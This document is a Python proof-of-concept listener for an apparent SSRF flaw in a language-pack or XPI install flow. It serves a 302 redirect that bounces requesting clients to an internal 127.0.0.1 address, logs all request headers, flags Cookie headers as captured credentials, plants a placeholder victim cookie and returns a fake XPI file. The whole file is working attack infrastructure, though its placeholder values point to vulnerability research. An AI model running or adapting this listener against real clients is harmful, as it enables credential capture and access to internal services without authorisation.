#!/usr/bin/env python3
"""Listener for the LangPack SSRF PoC. Serves /redir (302 -> hop2) and logs everything. Ctrl+C stops."""
import http.server, socketserver, datetime

PORT, HOP2 = 8798, 8798
RED, GRN, YEL, DIM, RST = "\033[91m", "\033[92m", "\033[93m", "\033[2m", "\033[0m"
HITS = []

class H(http.server.BaseHTTPRequestHandler):
    def _dump(self, note=""):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        HITS.append(self.path)
        print(f"\n{GRN}{'='*74}{RST}")
        print(f"{GRN}[{ts}] {self.command} {self.path} {self.request_version} {note}{RST}")
        for k, v in self.headers.items():
            if k.lower() == "cookie":
                print(f"  {RED}{k}: {v}{RST}   <-- CREDENTIALS")
            elif k.lower() in ("user-agent", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest"):
                print(f"  {YEL}{k}: {v}{RST}")
            else:
                print(f"  {DIM}{k}: {v}{RST}")
        ck = self.headers.get("Cookie")
        print(f"  {DIM}(cookie header: {ck!r}){RST}")
        print(f"{GRN}{'='*74}{RST}")

    def do_GET(self):
        if self.path.startswith("/redir"):
            self._dump("(hop 1 -> 302)")
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{HOP2}/REDIR-HOP2-INTERNAL")
            self.end_headers(); return
        if self.path.startswith("/setcookie"):
            self._dump()
            b = b"ok"
            self.send_response(200)
            self.send_header("Set-Cookie", "lpsess=LANGPACK_VICTIM_COOKIE; Path=/")
            self.send_header("Content-Length", str(len(b))); self.end_headers()
            self.wfile.write(b); return
        self._dump()
        b = b"NOT-A-REAL-XPI"
        self.send_response(200)
        self.send_header("Content-Type", "application/x-xpinstall")
        self.send_header("Content-Length", str(len(b))); self.end_headers()
        self.wfile.write(b)
    do_HEAD = do_GET
    def log_message(self, *a): pass

if __name__ == "__main__":
    socketserver.TCPServer.allow_reuse_address = True
    print(f"listener on 0.0.0.0:{PORT} (serves /redir 302 -> /REDIR-HOP2-INTERNAL)")
    try:
        socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    except KeyboardInterrupt:
        print(f"\n{len(HITS)} request(s): {HITS}")
